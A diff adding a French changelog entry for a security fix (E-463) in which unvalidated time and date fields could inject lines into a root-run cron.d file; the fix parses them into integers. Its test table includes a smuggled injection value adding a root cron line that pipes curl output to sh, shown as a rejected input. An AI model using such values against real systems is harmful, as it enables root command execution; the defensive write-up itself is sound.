@@ -886,6 +886,95 @@ qui double celle qui existe.* Corrigé avec sa remesure datée.
                     `fail2ban.js` — deux fichiers d'une AUTRE session. Non rafraichi
                     ici : le faire masquerait leur signal.
 
+## [2.0.393] - 2026-09-08
+
+### Securite - E-463 : `time_` et `date` atteignaient une ligne de `cron.d` executee en root
+
+**Symptome.** Les deux routes « advanced » de planification construisaient leur
+expression cron par `time_.split(':')` et `date.split('-')`, **sans aucune
+validation de forme** — `if not all([date, time_])` ne verifie que la PRESENCE.
+Le resultat part en base64 vers `/etc/cron.d/…`, puis `chmod 0644` et
+`systemctl restart cron`.
+
+    POST /schedule_advanced_update             4 branches,  + mar. 08 sept. 2026 11:58:31 CEST
+    POST /schedule_advanced_security_update    4 branches, / en CHAINES
+
+**⚠ Le base64 n'est pas le defaut, il est le TRANSPORTEUR.** *Cote shell il est
+irreprochable — alphabet `[A-Za-z0-9+/=]`, aucun metacaractere — et la regle
+semgrep de shell se tait A JUSTE TITRE.* **Mais le puits n'est pas le shell** : le
+flux decode est un fichier `cron.d`, ou un saut de ligne suivi de n'importe quoi
+devient **une ligne executee en root**.
+
+**Le seul `strptime` du fichier ne couvrait que `date`, et seulement la branche
+`weekly` de la seconde route. `time_` n'etait valide nulle part.**
+
+### Le correctif DERIVE, il ne filtre pas
+
+Deux fonctions en tete de module rendent des **entiers** :
+`_cron_heure_minute` (bornes [0,23] et [0,59]) et `_cron_annee_mois_jour`
+(`strptime` puis `d.year/d.month/d.day`). **La chaine recue n'est jamais
+reemise.** La validation a lieu **avant toute connexion** : une valeur forgee est
+refusee sans qu'aucune machine ne soit jointe.
+
+**⛔ Pourquoi pas une regex.** *En Python une ancre `$` accepte un `
+` FINAL : une
+telle garde ne tiendrait que par le `.strip()` voisin, et un `.strip()` voisin se
+retire par megarde.*
+
+**⚠ Et pourquoi la tolerance de `int()` est SANS EFFET ici** — mesuree :
+
+    int('14
+')                    -> 14        le saut de ligne est avale
+    int('١٤')                    -> 14        chiffres arabes-indiens acceptes
+    int('14
+* * * * * root x')    -> ValueError
+
+**Un filtre aurait du enumerer ce que `int()` tolere. Une derivation s'en
+moque** — elle n'emploie que la valeur PRODUITE. *La forme etait deja dans ce
+fichier : `schedule_update` (`:411`) n'interpole que `int(…)`. Les deux routes
+« advanced » etaient un OUBLI, pas une architecture.*
+
+### Le temoin — DANS LES DEUX SENS
+
+    nominal   '14:30'  '00:00'  '23:59'            ACCEPTE
+    attaque   '14
+* * * * * root curl x|sh:30'    REFUSE
+    bornes    '24:00'  '12:60'                     REFUSE
+    forme     '1430'  ''                           REFUSE
+    date      '2026-01-05
+'  '2026-01-05 x'       REFUSE
+              '2026-01-05'                          ACCEPTE -> (2026, 1, 5)
+
+**⚠ Et le cas intermediaire, qui montre POURQUOI deriver bat filtrer :**
+
+    '14
+:30'  ->  ACCEPTE, (14, 30)  ->  ligne cron : '30 14 * * *'
+
+**Le saut de ligne est avale par `int()` et ne survit pas, parce que la ligne est
+batie depuis des entiers.** *Accepter cette entree est sur : la valeur est
+NORMALISEE, pas reinjectee. Un filtre aurait du la refuser ; un deriveur n'a pas
+besoin de la voir.*
+
+### ⚠ Un defaut que j'ai introduit et rattrape
+
+**Mon recablage a laisse la branche annuelle de la seconde route employer
+`minute`, `hour` et `parts_date` — que je venais de supprimer.** *L'import REEL
+du module n'a rien vu : Python ne resout les noms qu'a l'execution.* **Rattrape
+par un controle AST des noms lus et non lies** (`ruff` est absent de l'hote et du
+conteneur depuis le 2026-09-06). *Un `NameError` sur la branche annuelle aurait
+transforme une planification en 500.*
+
+**Tests.** Import reel, controle AST des noms, **683 passed, 5 skipped,
+2 xfailed, 0 FAILED**. Aucune machine jointe, aucun cron ecrit, aucune
+planification emise.
+
+**⛔ Non eprouve au service.** `backend/**.py` est lu au demarrage : ce correctif
+est **inerte jusqu'a la recreation du conteneur**, donc les deux routes n'ont pas
+pu etre exercees de bout en bout aujourd'hui. *Les deriveurs, eux, sont eprouves
+directement — ce sont des fonctions pures.*
+
+---
+
 ## [2.0.303] - 2026-09-08
 
 ### Securite - E-462 : `APP_URL` n'etait declaree NULLE PART, donc gardee par rien
